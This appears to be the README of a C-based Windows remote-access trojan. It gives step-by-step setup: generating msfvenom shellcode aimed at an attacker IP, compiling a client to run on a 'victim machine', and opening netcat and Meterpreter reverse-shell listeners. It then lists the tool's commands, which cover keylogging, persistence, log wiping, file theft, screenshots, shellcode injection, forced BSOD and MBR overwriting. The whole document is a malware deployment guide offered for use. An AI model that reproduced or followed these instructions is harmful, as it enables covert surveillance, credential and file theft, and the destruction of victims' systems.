# Setup

After cloning the whole project and getting inside of the x64 folder:

1. Open Client.c and replace the contents of the variable ServerIP at line 30 with the IP address of the attacker machine

2. From the terminal, generate the shellcode for ShellcodeX64 using the first commented msfvenom command (Replace the LHOST variable with the IP address of the attacker machine)

3. Now Generate the respective shellcodes for ShellcodeSpawnNetcat and FallBackShell using the last 2 commented msfvenom commands (Replace the LHOST variable just like you did before (2.) )

4. Copy the output from msfvenom for ShellcodeSpawnNetcat and FallBackShell, and paste it inside of ESH.c

5. Compile and execute ESH.c
```bash
gcc ESH.c -o esh && ./esh
```

6. Grab the output of esh, and replace ShellcodeSpawnNetcat and FallBackShell inside of the Client.c file and save.

7. Open Server.c and replace the contents at line 14 with the IP address of the attacker machine and save.

8. You should now be good to go, compile everything by typing:
```bash
x86_64-w64-mingw32-gcc -o Client.exe Client.c -lwsock32 -lwininet -lgdi32 -lntdll && gcc Server.c -o Server -lpthread && echo "Compilation Successful"
```

9. If everything went correctly, the string "Compilation Successful" should popup in your terminal. If not, there was an error when trying to compile. Make sure you did everything correctly.

10. Setting the server: Before executing the Client on the victim machine, you must make sure to open another tab in your terminal (On the attacker machine), and execute the following command:
```bash
nc -lvnp 38524
```

If you don't do this, when executing Client.exe, no reverse shell will be received due to the fact that you weren't listening on port 38524, and Client.exe will crash (The same thing will happen if you decide to send 'startcat' before listening for a connection on port 443)

11. Now you should start the main server by typing:
```bash
./Server start
```

12. Before using 'inject64', open a new terminal tab, load msfconsole, and paste the lines below:
```bash
use exploit/multi/handler
set LHOST SERVER-IP
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
run
```

Everything should now be ready. Start the server, the client, and enjoy :)

# Commands

q : Closes the connection with the client and exits

menu : Prints the menu showing all available commands

startlogger : Starts logging keystrokes and saves them to a file named 'out.txt' on the client machine

stoplogger : Stops logging keystrokes

persistence1 -> persistence5 : Uses hardcoded paths to establish persistence (persistence4 and persistence5 require Administrator privileges)

removepers : Removes all hardcoded persistence methods used on the remote host

isvm : Performs basic checks to determine whether the client is running inside a virtual machine and returns the results

isadmin : Verifies whether the server has administrative privileges

cleanlogs : Removes the Event Viewer logs

updateurl : Updates the URL used to download files on the remote host

download : Downloads a file to the remote host using the URL and a specified filename

getfile : Retrieves a file from the remote host and transfers it to the server

diskspace : Returns the disk space for the C: drive

drives : Enumerates all connected drives

screenshot : Takes a screenshot of the remote host's desktop and transfers it to the server

cleanbin : Cleans the recycle bin (No popup)

hostname : Retrieves the hostname of the remote host

popup : Spawns a visible popup on the remote host (For debug)

bsodwin : Crashes the remote host, causing a BSOD (Blue Screen of Death)

wipembr : Overwrites the MBR on the remote host

inject64 : Spawns a new Notepad process and injects shellcode into it to establish a reverse shell connection to the msfconsole listener

startcat : Injects shellcode to connect to a listener running on the server
